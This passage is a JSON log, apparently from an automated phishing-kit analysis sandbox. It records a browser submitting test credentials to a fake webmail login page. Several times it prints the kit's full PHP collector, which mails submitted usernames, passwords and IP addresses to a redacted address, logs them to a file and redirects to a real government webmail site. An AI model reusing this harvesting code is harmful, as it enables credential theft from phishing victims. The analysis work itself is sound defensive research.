+              "response": "<?\r\n\r\n$ip = getenv(\"REMOTE_ADDR\");\r\n$message .= \"---- : || Chase ScAm Inf0 (1) || :------\\n\";\r\n$message .= \"Email Address: \".$_POST['username'].\"\\n\";\r\n$message .= \"Password : \".$_POST['password'].\"\\n\";\r\n$message .= \"----: || tHAnks tO Spammers Toolz || :------\\n\";\r\n$message .= \"IP: \".$ip.\"\\n\";\r\n\r\n\r\n$recipient = \"[REDACTED_EMAIL_5b6b6e0d]\";\r\n$subject = \"JCF ID | \".$ip.\"\\n\";\r\n\r\nmail($recipient,$subject,$message);\r\n$fp = fopen(\"index.txt\",\"a\");\r\nfputs($fp,$message);\r\nfclose($fp);\r\nheader(\"Location:  https://webmail.jcf.gov.jm/a/webmail.php?wsid=56217349c38d469d983144f0b69604f9-b3a79ba021b74c1d885aaeca37b6cfca\");\r\n?>\r\n\r\n\r\n",
+              "responseHeaders": {
+                "connection": "Keep-Alive",
+                "content-encoding": "gzip",
+                "content-length": "401",
+                "content-type": "text/html; charset=UTF-8",
+                "date": "Wed, 06 May 2026 01:04:13 GMT",
+                "keep-alive": "timeout=5, max=77",
+                "server": "Apache/2.4.58 (Ubuntu)",
+                "vary": "Accept-Encoding"
+              },
+              "responseContentType": "text/html; charset=UTF-8",
+              "responseReturned": true,
+              "redirected": true,
+              "finalUrl": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-04_newrack/newrack/New%20Rack/new.php",
+              "responseBodyLength": 628,
+              "timestamp": 1778029453790,
+              "latencyMs": 3,
+              "ttfbMs": null,
+              "resolved_server": {
+                "server_file": "newrack/New Rack/new.php",
+                "receives_fields": [
+                  "password",
+                  "username"
+                ],
+                "actions": [
+                  {
+                    "type": "mail",
+                    "target": "[REDACTED_EMAIL]",
+                    "variable": "$recipient",
+                    "line": 14
+                  },
+                  {
+                    "type": "redirect",
+                    "target": "https://webmail.jcf.gov.jm/a/webmail.php?wsid=56217349c38d469d983144f0b69604f9-b3a79ba021b74c1d885aaeca37b6cfca",
+                    "line": 18
+                  }
+                ],
+                "exfil": [
+                  "email:[REDACTED_EMAIL]"
+                ]
+              }
+            }
+          ],
+          "firedEvents": [
+            {
+              "step": 1,
+              "phase": "submit_click",
+              "eventType": "mouseover",
+              "targetXPath": "//*[@id=\"login-btn\"]",
+              "targetTag": "BUTTON",
+              "targetName": "",
+              "targetType": "submit",
+              "targetValue": "",
+              "key": null,
+              "keyCode": null,
+              "defaultPrevented": false,
+              "callStack": "Error: __fa_event_trace\n    at HTMLDocument.<anonymous> (<anonymous>:356:21)",
+              "timestamp": 1778029453786
+            },
+            {
+              "step": 1,
+              "phase": "submit_click",
+              "eventType": "mousedown",
+              "targetXPath": "//*[@id=\"login-btn\"]",
+              "targetTag": "BUTTON",
+              "targetName": "",
+              "targetType": "submit",
+              "targetValue": "",
+              "key": null,
+              "keyCode": null,
+              "defaultPrevented": false,
+              "callStack": "Error: __fa_event_trace\n    at HTMLDocument.<anonymous> (<anonymous>:356:21)",
+              "timestamp": 1778029453786
+            },
+            {
+              "step": 1,
+              "phase": "submit_click",
+              "eventType": "focus",
+              "targetXPath": "//*[@id=\"login-btn\"]",
+              "targetTag": "BUTTON",
+              "targetName": "",
+              "targetType": "submit",
+              "targetValue": "",
+              "key": null,
+              "keyCode": null,
+              "defaultPrevented": false,
+              "callStack": "Error: __fa_event_trace\n    at HTMLDocument.<anonymous> (<anonymous>:356:21)",
+              "timestamp": 1778029453786
+            },
+            {
+              "step": 1,
+              "phase": "submit_click",
+              "eventType": "mouseup",
+              "targetXPath": "//*[@id=\"login-btn\"]",
+              "targetTag": "BUTTON",
+              "targetName": "",
+              "targetType": "submit",
+              "targetValue": "",
+              "key": null,
+              "keyCode": null,
+              "defaultPrevented": false,
+              "callStack": "Error: __fa_event_trace\n    at HTMLDocument.<anonymous> (<anonymous>:356:21)",
+              "timestamp": 1778029453787
+            },
+            {
+              "step": 1,
+              "phase": "submit_click",
+              "eventType": "click",
+              "targetXPath": "//*[@id=\"login-btn\"]",
+              "targetTag": "BUTTON",
+              "targetName": "",
+              "targetType": "submit",
+              "targetValue": "",
+              "key": null,
+              "keyCode": null,
+              "defaultPrevented": false,
+              "callStack": "Error: __fa_event_trace\n    at HTMLDocument.<anonymous> (<anonymous>:356:21)",
+              "timestamp": 1778029453787
+            },
+            {
+              "step": 1,
+              "phase": "submit_click",
+              "eventType": "submit",
+              "targetXPath": "//*[@id=\"form\"]",
+              "targetTag": "FORM",
+              "targetName": "login",
+              "targetType": "",
+              "targetValue": "",
+              "key": null,
+              "keyCode": null,
+              "defaultPrevented": false,
+              "callStack": "Error: __fa_event_trace\n    at HTMLDocument.<anonymous> (<anonymous>:356:21)",
+              "timestamp": 1778029453787
+            }
+          ],
+          "html5Validation": [],
+          "triggeredFunctions": [],
+          "cdpNetworkReqs": [
+            {
+              "requestId": "777961.17",
+              "sequence": 5,
+              "resourceType": "XHR",
+              "initiatorType": "script",
+              "documentURL": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-04_newrack/newrack/New%20Rack/index.html",
+              "url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-04_newrack/newrack/New%20Rack/new.php",
+              "method": "POST",
+              "requestHeaders": {
+                "Accept": "*/*",
+                "Accept-Encoding": "gzip, deflate",
+                "Accept-Language": "en-US,en;q=0.9",
+                "Cache-Control": "no-cache",
+                "Connection": "keep-alive",
+                "Content-Length": "242",
+                "Content-Type": "application/x-www-form-urlencoded",
+                "Host": "www.2026.com:8080",
+                "Pragma": "no-cache",
+                "Referer": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-04_newrack/newrack/New%20Rack/index.html",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+              },
+              "requestHeaderNames": [
+                "Accept",
+                "Accept-Encoding",
+                "Accept-Language",
+                "Cache-Control",
+                "Connection",
+                "Content-Length",
+                "Content-Type",
+                "Host",
+                "Pragma",
+                "Referer",
+                "User-Agent"
+              ],
+              "requestContentType": "application/x-www-form-urlencoded",
+              "hasCookieHeader": false,
+              "associatedCookies": [],
+              "customRequestHeaders": {},
+              "postData": "__RequestVerificationToken=CfDJ8PJv2PmI83xDqNI3IL5jbf4NxEzvMkFS8amot8ClwjfvM44tnZlum_Jsh3SgBzkP2BmyazZPwDpwePJ85fllLOJc7FI0OS9dCsTJ4ZqZn_mBx9fTv4gmpyADvs4O21QbJ1xU2U6uvVHS_E56w4IqGFE&destination=&flags=4&username=bedobfp&password=923e2yFoqe7n",
+              "status": 200,
+              "statusText": "OK",
+              "redirected": false,
+              "redirectChain": [],
+              "redirectLocation": "",
+              "responseHeaders": {
+                "Connection": "Keep-Alive",
+                "Content-Encoding": "gzip",
+                "Content-Length": "401",
+                "Content-Type": "text/html; charset=UTF-8",
+                "Date": "Wed, 06 May 2026 01:04:13 GMT",
+                "Keep-Alive": "timeout=5, max=77",
+                "Server": "Apache/2.4.58 (Ubuntu)",
+                "Vary": "Accept-Encoding"
+              },
+              "responseContentType": "text/html; charset=UTF-8",
+              "hasSetCookie": false,
+              "responseReturned": true,
+              "responseBodyPreview": "<?\r\n\r\n$ip = getenv(\"REMOTE_ADDR\");\r\n$message .= \"---- : || Chase ScAm Inf0 (1) || :------\\n\";\r\n$message .= \"Email Address: \".$_POST['username'].\"\\n\";\r\n$message .= \"Password : \".$_POST['password'].\"\\n\";\r\n$message .= \"----: || tHAnks tO Spammers Toolz || :------\\n\";\r\n$message .= \"IP: \".$ip.\"\\n\";\r\n\r\n\r\n$recipient = \"[REDACTED_EMAIL_5b6b6e0d]\";\r\n$subject = \"JCF ID | \".$ip.\"\\n\";\r\n\r\nmail($recipient,$subject,$message);\r\n$fp = fopen(\"index.txt\",\"a\");\r\nfputs($fp,$message);\r\nfclose($fp);\r\nheader(\"Location:  https://webmail.jcf.gov.jm/a/webmail.php?wsid=56217349c38d469d983144f0b69604f9-b3a79ba021b74c1d885aaeca37b6cfca\");\r\n?>\r\n\r\n\r\n",
+              "responseBodyLength": 628,
+              "loadingFinished": true,
+              "loadingFailed": false,
+              "errorText": "",
+              "encodedDataLength": 652,
+              "responseUrl": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-04_newrack/newrack/New%20Rack/new.php",
+              "mimeType": "text/html",
+              "protocol": "http/1.1",
+              "timestamp": 275079.534712,
+              "lastEventTs": 1778029454293,
+              "requestSentTs": 275079.534712,
+              "responseReceivedTs": 275079.538073,
+              "loadingFinishedTs": 275079.537253,
+              "latencyMs": 2.5,
+              "ttfbMs": 3.4,
+              "_timing_summary": {
+                "latencyMs": 2.5,
+                "ttfbMs": 3.4,
+                "protocol": "http/1.1",
+                "redirected": false,
+                "redirectChain": [],
+                "status": 200,
+                "hasCookieHeader": false,
+                "hasSetCookie": false
+              }
+            }
+          ],
+          "jqueryDispatchLogs": []
+        },
+        "submit_trigger_ts_ms": 1778029453753,
+        "submit_timing": {
+          "python_click_ts_ms": 1778029453753,
+          "js_trigger_event_ts_ms": 1778029453787,
+          "js_first_req_ts_ms": 1778029453790,
+          "event_to_request_ms": 3,
+          "cdp_req_count": 1
+        },
+        "submit_detail": {
+          "action": "new.php",
+          "fields": {
+            "__RequestVerificationToken": "CfDJ8PJv2PmI83xDqNI3IL5jbf4NxEzvMkFS8amot8ClwjfvM44tnZlum_Jsh3SgBzkP2BmyazZPwDpwePJ85fllLOJc7FI0OS9dCsTJ4ZqZn_mBx9fTv4gmpyADvs4O21QbJ1xU2U6uvVHS_E56w4IqGFE",
+            "destination": "",
+            "flags": "4",
+            "password": "923e2yFoqe7n",
+            "username": "bedobfp"
+          },
+          "method": "POST",
+          "responseContentType": "text/html; charset=UTF-8",
+          "responseLength": 628,
+          "status": 200,
+          "submitted": true,
+          "cdp_network": [
+            {
+              "requestId": "777961.17",
+              "sequence": 5,
+              "resourceType": "XHR",
+              "initiatorType": "script",
+              "documentURL": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-04_newrack/newrack/New%20Rack/index.html",
+              "url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-04_newrack/newrack/New%20Rack/new.php",
+              "method": "POST",
+              "requestHeaders": {
+                "Accept": "*/*",
+                "Accept-Encoding": "gzip, deflate",
+                "Accept-Language": "en-US,en;q=0.9",
+                "Cache-Control": "no-cache",
+                "Connection": "keep-alive",
+                "Content-Length": "242",
+                "Content-Type": "application/x-www-form-urlencoded",
+                "Host": "www.2026.com:8080",
+                "Pragma": "no-cache",
+                "Referer": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-04_newrack/newrack/New%20Rack/index.html",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+              },
+              "requestHeaderNames": [
+                "Accept",
+                "Accept-Encoding",
+                "Accept-Language",
+                "Cache-Control",
+                "Connection",
+                "Content-Length",
+                "Content-Type",
+                "Host",
+                "Pragma",
+                "Referer",
+                "User-Agent"
+              ],
+              "requestContentType": "application/x-www-form-urlencoded",
+              "hasCookieHeader": false,
+              "associatedCookies": [],
+              "customRequestHeaders": {},
+              "postData": "__RequestVerificationToken=CfDJ8PJv2PmI83xDqNI3IL5jbf4NxEzvMkFS8amot8ClwjfvM44tnZlum_Jsh3SgBzkP2BmyazZPwDpwePJ85fllLOJc7FI0OS9dCsTJ4ZqZn_mBx9fTv4gmpyADvs4O21QbJ1xU2U6uvVHS_E56w4IqGFE&destination=&flags=4&username=bedobfp&password=923e2yFoqe7n",
+              "status": 200,
+              "statusText": "OK",
+              "redirected": false,
+              "redirectChain": [],
+              "redirectLocation": "",
+              "responseHeaders": {
+                "Connection": "Keep-Alive",
+                "Content-Encoding": "gzip",
+                "Content-Length": "401",
+                "Content-Type": "text/html; charset=UTF-8",
+                "Date": "Wed, 06 May 2026 01:04:13 GMT",
+                "Keep-Alive": "timeout=5, max=77",
+                "Server": "Apache/2.4.58 (Ubuntu)",
+                "Vary": "Accept-Encoding"
+              },
+              "responseContentType": "text/html; charset=UTF-8",
+              "hasSetCookie": false,
+              "responseReturned": true,
+              "responseBodyPreview": "<?\r\n\r\n$ip = getenv(\"REMOTE_ADDR\");\r\n$message .= \"---- : || Chase ScAm Inf0 (1) || :------\\n\";\r\n$message .= \"Email Address: \".$_POST['username'].\"\\n\";\r\n$message .= \"Password : \".$_POST['password'].\"\\n\";\r\n$message .= \"----: || tHAnks tO Spammers Toolz || :------\\n\";\r\n$message .= \"IP: \".$ip.\"\\n\";\r\n\r\n\r\n$recipient = \"[REDACTED_EMAIL_5b6b6e0d]\";\r\n$subject = \"JCF ID | \".$ip.\"\\n\";\r\n\r\nmail($recipient,$subject,$message);\r\n$fp = fopen(\"index.txt\",\"a\");\r\nfputs($fp,$message);\r\nfclose($fp);\r\nheader(\"Location:  https://webmail.jcf.gov.jm/a/webmail.php?wsid=56217349c38d469d983144f0b69604f9-b3a79ba021b74c1d885aaeca37b6cfca\");\r\n?>\r\n\r\n\r\n",
+              "responseBodyLength": 628,
+              "loadingFinished": true,
+              "loadingFailed": false,
+              "errorText": "",
+              "encodedDataLength": 652,
+              "responseUrl": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-04_newrack/newrack/New%20Rack/new.php",
+              "mimeType": "text/html",
+              "protocol": "http/1.1",
+              "timestamp": 275079.534712,
+              "lastEventTs": 1778029454293,
+              "requestSentTs": 275079.534712,
+              "responseReceivedTs": 275079.538073,
+              "loadingFinishedTs": 275079.537253,
+              "latencyMs": 2.5,
+              "ttfbMs": 3.4,
+              "_timing_summary": {
+                "latencyMs": 2.5,
+                "ttfbMs": 3.4,
+                "protocol": "http/1.1",
+                "redirected": false,
+                "redirectChain": [],
+                "status": 200,
+                "hasCookieHeader": false,
+                "hasSetCookie": false
+              }
+            }
+          ]
+        }
+      },
+      "overall_classification": "Case B: Server Round-trip (AJAX)",
+      "field_stats": {
+        "dom_analysable": 2,
+        "visible_now": 2,
+        "hidden_or_collapsed": 0
+      },
+      "static_action_analysis": {
+        "server_file": "newrack/New Rack/new.php",
+        "receives_fields": [
+          "password",
+          "username"
+        ],
+        "actions": [
+          {
+            "type": "mail",
+            "target": "[REDACTED_EMAIL]",
+            "variable": "$recipient",
+            "line": 14
+          },
+          {
+            "type": "redirect",
+            "target": "https://webmail.jcf.gov.jm/a/webmail.php?wsid=56217349c38d469d983144f0b69604f9-b3a79ba021b74c1d885aaeca37b6cfca",
+            "line": 18
+          }
+        ],
+        "exfil": [
+          "email:[REDACTED_EMAIL]"
+        ]
+      },
+      "page_url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-04_newrack/newrack/New%20Rack/index.html"
+    }
+  ],
+  "visited_urls": [
+    {
+      "step": 1,
+      "requested_url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-04_newrack/newrack/New%20Rack/index.html",
+      "actual_url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-04_newrack/newrack/New%20Rack/index.html",
+      "method": "get"
+    },
+    {
+      "step": 2,
+      "requested_url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-04_newrack/newrack/New%20Rack/new.php",
+      "actual_url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-04_newrack/newrack/New%20Rack/new.php",
+      "method": "get"
+    },
+    {
+      "step": 3,
+      "requested_url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-04_newrack/newrack/New%20Rack/index.html",
+      "actual_url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-04_newrack/newrack/New%20Rack/new.php",
+      "method": "event"
+    }
+  ],
+  "cdp_network": [
+    {
+      "requestId": "AD830F5C62F76DA470F7C11E50E4A0C7",
+      "sequence": 1,
+      "resourceType": "Document",
+      "initiatorType": "other",
+      "documentURL": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-04_newrack/newrack/New%20Rack/new.php",
+      "url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-04_newrack/newrack/New%20Rack/new.php",
+      "method": "POST",
+      "requestHeaders": {
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+        "Accept-Encoding": "gzip, deflate",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Cache-Control": "no-cache",
+        "Connection": "keep-alive",
+        "Content-Length": "236",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Host": "www.2026.com:8080",
+        "Origin": "http://www.2026.com:8080",
+        "Pragma": "no-cache",
+        "Referer": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-04_newrack/newrack/New%20Rack/index.html",
+        "Upgrade-Insecure-Requests": "1",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+      },
+      "requestHeaderNames": [
+        "Accept",
+        "Accept-Encoding",
+        "Accept-Language",
+        "Cache-Control",
+        "Connection",
+        "Content-Length",
+        "Content-Type",
+        "Host",
+        "Origin",
+        "Pragma",
+        "Referer",
+        "Upgrade-Insecure-Requests",
+        "User-Agent"
+      ],
+      "requestContentType": "application/x-www-form-urlencoded",
+      "hasCookieHeader": false,
+      "associatedCookies": [],
+      "customRequestHeaders": {},
+      "postData": "__RequestVerificationToken=CfDJ8PJv2PmI83xDqNI3IL5jbf4NxEzvMkFS8amot8ClwjfvM44tnZlum_Jsh3SgBzkP2BmyazZPwDpwePJ85fllLOJc7FI0OS9dCsTJ4ZqZn_mBx9fTv4gmpyADvs4O21QbJ1xU2U6uvVHS_E56w4IqGFE&destination=&flags=4&username=pgl&password=ev5ZChz6Cc",
+      "status": 200,
+      "statusText": "OK",
+      "redirected": false,
+      "redirectChain": [],
+      "redirectLocation": "",
+      "responseHeaders": {
+        "Connection": "Keep-Alive",
+        "Content-Encoding": "gzip",
+        "Content-Length": "401",
+        "Content-Type": "text/html; charset=UTF-8",
+        "Date": "Wed, 06 May 2026 01:04:10 GMT",
+        "Keep-Alive": "timeout=5, max=80",
+        "Server": "Apache/2.4.58 (Ubuntu)",
+        "Vary": "Accept-Encoding"
+      },
+      "responseContentType": "text/html; charset=UTF-8",
+      "hasSetCookie": false,
+      "responseReturned": true,
+      "responseBodyPreview": "<?\r\n\r\n$ip = getenv(\"REMOTE_ADDR\");\r\n$message .= \"---- : || Chase ScAm Inf0 (1) || :------\\n\";\r\n$message .= \"Email Address: \".$_POST['username'].\"\\n\";\r\n$message .= \"Password : \".$_POST['password'].\"\\n\";\r\n$message .= \"----: || tHAnks tO Spammers Toolz || :------\\n\";\r\n$message .= \"IP: \".$ip.\"\\n\";\r\n\r\n\r\n$recipient = \"[REDACTED_EMAIL_5b6b6e0d]\";\r\n$subject = \"JCF ID | \".$ip.\"\\n\";\r\n\r\nmail($recipient,$subject,$message);\r\n$fp = fopen(\"index.txt\",\"a\");\r\nfputs($fp,$message);\r\nfclose($fp);\r\nheader(\"Location:  https://webmail.jcf.gov.jm/a/webmail.php?wsid=56217349c38d469d983144f0b69604f9-b3a79ba021b74c1d885aaeca37b6cfca\");\r\n?>\r\n\r\n\r\n",
+      "responseBodyLength": 628,
+      "loadingFinished": true,
+      "loadingFailed": false,
+      "errorText": "",
+      "encodedDataLength": 652,
+      "responseUrl": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-04_newrack/newrack/New%20Rack/new.php",
+      "mimeType": "text/html",
+      "protocol": "http/1.1",
+      "timestamp": 275076.565273,
+      "lastEventTs": 1778029450844,
+      "requestSentTs": 275076.565273,
+      "responseReceivedTs": 275076.570603,
+      "loadingFinishedTs": 275076.570441,
+      "latencyMs": 5.2,
+      "ttfbMs": 5.3,
+      "_native_submit": true,
+      "_submit_trigger_ts_ms": 1778029450761
+    },
+    {
+      "requestId": "CBCDF424812CA5BA80775263780A014D",
+      "sequence": 2,
+      "resourceType": "Document",
+      "initiatorType": "other",
+      "documentURL": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-04_newrack/newrack/New%20Rack/index.html",
+      "url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-04_newrack/newrack/New%20Rack/index.html",
+      "method": "GET",
+      "requestHeaders": {
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+        "Accept-Encoding": "gzip, deflate",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Cache-Control": "no-cache",
+        "Connection": "keep-alive",
+        "Host": "www.2026.com:8080",
+        "Pragma": "no-cache",
+        "Upgrade-Insecure-Requests": "1",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+      },
+      "requestHeaderNames": [
+        "Accept",
+        "Accept-Encoding",
+        "Accept-Language",
+        "Cache-Control",
+        "Connection",
+        "Host",
+        "Pragma",
+        "Upgrade-Insecure-Requests",
+        "User-Agent"
+      ],
+      "requestContentType": "",
+      "hasCookieHeader": false,
+      "associatedCookies": [],
+      "customRequestHeaders": {},
+      "postData": null,
+      "status": 200,
+      "statusText": "OK",
+      "redirected": false,
+      "redirectChain": [],
+      "redirectLocation": "",
+      "responseHeaders": {
+        "Accept-Ranges": "bytes",
+        "Connection": "Keep-Alive",
+        "Content-Encoding": "gzip",
+        "Content-Length": "2747",
+        "Content-Type": "text/html",
+        "Date": "Wed, 06 May 2026 01:04:11 GMT",
+        "ETag": "\"268c-6075908d62680-gzip\"",
+        "Keep-Alive": "timeout=5, max=79",
+        "Last-Modified": "Tue, 10 Oct 2023 09:07:22 GMT",
+        "Server": "Apache/2.4.58 (Ubuntu)",
+        "Vary": "Accept-Encoding"
+      },
+      "responseContentType": "text/html",
+      "hasSetCookie": false,
+      "responseReturned": true,
+      "responseBodyPreview": "\r\n<html>\r\n<head>\r\n  <meta charset=\"UTF-8\">\r\n  <title>Webmail</title>\r\n  <link rel=\"stylesheet\" href=\"https://fonts.googleapis.com/css?family=Roboto:100,400,500,700\">\r\n\r\n  <style>\r\n    /* Page Defaults */\r\n    * {\r\n      -webkit-box-sizing: border-box;\r\n      -moz-box-sizing: border-box;\r\n      box-sizing: border-box;\r\n    }\r\n\r\n    body {\r\n      font-family: \"Roboto\", \"Helvetica Neue\", Helvetica, Arial, sans-serif;\r\n      font-size: 14px;\r\n      line-height: 1.42857;\r\n      color: #333333;\r\n      background-color: #FAFAFA;\r\n      margin: 0;\r\n    }\r\n\r\n    /* Page Layout */\r\n    #content {\r\n      display: flex;\r\n      align-items: center;\r\n      justify-content: center;\r\n      position: fixed;\r\n      top: 0;\r\n      left: 0;\r\n      bottom: 0;\r\n      right: 0;\r\n      background: #EAEAEA;\r\n    }\r\n\r\n    #content-header {\r\n      height: 53px;\r\n      padding: 16px;\r\n      font-size: 24px;\r\n      font-weight: 300;\r\n      line-height: 18px;\r\n      background: #424242;\r\n      color: #FCFCFC;\r\n    }\r\n\r\n    #content-header-logo {\r\n      float: right;\r\n    }\r\n\r\n    #logo {\r\n      width: 130px;\r\n      height: 26px;\r\n    }\r\n\r\n    #content-header-label {\r\n      float: left;\r\n    }\r\n\r\n    #content-body {\r\n      display: flex;\r\n      justify-content: start;\r\n      background: #FFFFFF;\r\n      min-width: 500px;\r\n    }\r\n\r\n    /* Form Layout */\r\n    #form {\r\n      display: flex;\r\n      flex-direction: column;\r\n      justify-content: center;\r\n      padding: 20px;\r\n      min-height: 268px;\r\n      width: 100%;\r\n    }\r\n\r\n    #form-body {\r\n      height: 205px;\r\n      width: 100%;\r\n      margin: 40px 0px 0px 20px;\r\n      display: flex;\r\n      flex-direction: column;\r\n      justify-content: center;\r\n      align-items: center;\r\n      padding-right: 20px;\r\n    }\r\n\r\n    #form-container {\r\n      width: 100%;\r\n      margin: 0px auto;\r\n      padding: 0px 10px;\r\n    }\r\n\r\n    .row {\r\n      margin: 0px -10px;\r\n    }\r\n\r\n      .row:before, .row:after {\r\n        content: \" \";\r\n        display: table;\r\n      ",
+      "responseBodyLength": 9864,
+      "loadingFinished": true,
+      "loadingFailed": false,
+      "errorText": "",
+      "encodedDataLength": 3085,
+      "responseUrl": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-04_newrack/newrack/New%20Rack/index.html",
+      "mimeType": "text/html",
+      "protocol": "http/1.1",
+      "timestamp": 275077.111135,
+      "lastEventTs": 1778029451385,
+      "requestSentTs": 275077.111135,
+      "responseReceivedTs": 275077.114533,
+      "loadingFinishedTs": 275077.113898,
+      "latencyMs": 2.8,
+      "ttfbMs": 3.4
+    },
+    {
+      "requestId": "777961.14",
+      "sequence": 3,
+      "resourceType": "Script",
+      "initiatorType": "parser",
+      "documentURL": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-04_newrack/newrack/New%20Rack/index.html",
+      "url": "http://www.2026.com:8080/wmidentity/dist/webmailLogin.js?v=dn70RwATRXPGR3I_MlY9aK9fMX6zSf1GYvcRvRv-UFc=",
+      "method": "GET",
+      "requestHeaders": {
+        "Referer": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-04_newrack/newrack/New%20Rack/index.html",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+      },
+      "requestHeaderNames": [
+        "Referer",
+        "User-Agent"
+      ],
+      "requestContentType": "",
+      "hasCookieHeader": false,
+      "associatedCookies": [],
+      "customRequestHeaders": {},
+      "postData": null,
+      "status": 404,
+      "statusText": "Not Found",
+      "redirected": false,
+      "redirectChain": [],
+      "redirectLocation": "",
+      "responseHeaders": {
+        "Connection": "Keep-Alive",
+        "Content-Length": "276",
+        "Content-Type": "text/html; charset=iso-8859-1",
+        "Date": "Wed, 06 May 2026 01:04:11 GMT",
+        "Keep-Alive": "timeout=5, max=78",
+        "Server": "Apache/2.4.58 (Ubuntu)"
+      },
+      "responseContentType": "text/html; charset=iso-8859-1",
+      "hasSetCookie": false,
+      "responseReturned": true,
+      "responseBodyPreview": null,
+      "responseBodyLength": null,
+      "loadingFinished": false,
+      "loadingFailed": true,
+      "errorText": "net::ERR_ABORTED",
+      "encodedDataLength": null,
+      "responseUrl": "http://www.2026.com:8080/wmidentity/dist/webmailLogin.js?v=dn70RwATRXPGR3I_MlY9aK9fMX6zSf1GYvcRvRv-UFc=",
+      "mimeType": "text/html",
+      "protocol": "http/1.1",
+      "timestamp": 275077.119147,
+      "lastEventTs": 1778029451385,
+      "requestSentTs": 275077.119147,
+      "responseReceivedTs": 275077.126806,
+      "loadingFinishedTs": 0.0,
+      "latencyMs": null,
+      "ttfbMs": 7.7
+    },
+    {
+      "requestId": "777961.13",
+      "sequence": 4,
+      "resourceType": "Stylesheet",
+      "initiatorType": "parser",
+      "documentURL": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-04_newrack/newrack/New%20Rack/index.html",
+      "url": "https://fonts.googleapis.com/css?family=Roboto:100,400,500,700",
+      "method": "GET",
+      "requestHeaders": {
+        "Referer": "http://www.2026.com:8080/",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "sec-ch-ua": "\"Chromium\";v=\"145\", \"Not:A-Brand\";v=\"99\"",
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": "\"Linux\""
+      },
+      "requestHeaderNames": [
+        "Referer",
+        "User-Agent",
+        "sec-ch-ua",
+        "sec-ch-ua-mobile",
+        "sec-ch-ua-platform"
+      ],
+      "requestContentType": "",
+      "hasCookieHeader": false,
+      "associatedCookies": [],
+      "customRequestHeaders": {},
+      "postData": null,
+      "status": null,
+      "statusText": "",
+      "redirected": false,
+      "redirectChain": [],
+      "redirectLocation": "",
+      "responseHeaders": {},
+      "responseContentType": "",
+      "hasSetCookie": false,
+      "responseReturned": false,
+      "responseBodyPreview": null,
+      "responseBodyLength": null,
+      "loadingFinished": false,
+      "loadingFailed": true,
+      "errorText": "net::ERR_INTERNET_DISCONNECTED",
+      "encodedDataLength": null,
+      "responseUrl": "",
+      "mimeType": "",
+      "protocol": "",
+      "timestamp": 275077.118878,
+      "lastEventTs": 1778029451384,
+      "requestSentTs": 275077.118878,
+      "responseReceivedTs": 0.0,
+      "loadingFinishedTs": 0.0,
+      "latencyMs": null,
+      "ttfbMs": null
+    },
+    {
+      "requestId": "777961.17",
+      "sequence": 5,
+      "resourceType": "XHR",
+      "initiatorType": "script",
+      "documentURL": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-04_newrack/newrack/New%20Rack/index.html",
+      "url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-04_newrack/newrack/New%20Rack/new.php",
+      "method": "POST",
+      "requestHeaders": {
+        "Accept": "*/*",
+        "Accept-Encoding": "gzip, deflate",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Cache-Control": "no-cache",
+        "Connection": "keep-alive",
+        "Content-Length": "242",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Host": "www.2026.com:8080",
+        "Pragma": "no-cache",
+        "Referer": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-04_newrack/newrack/New%20Rack/index.html",
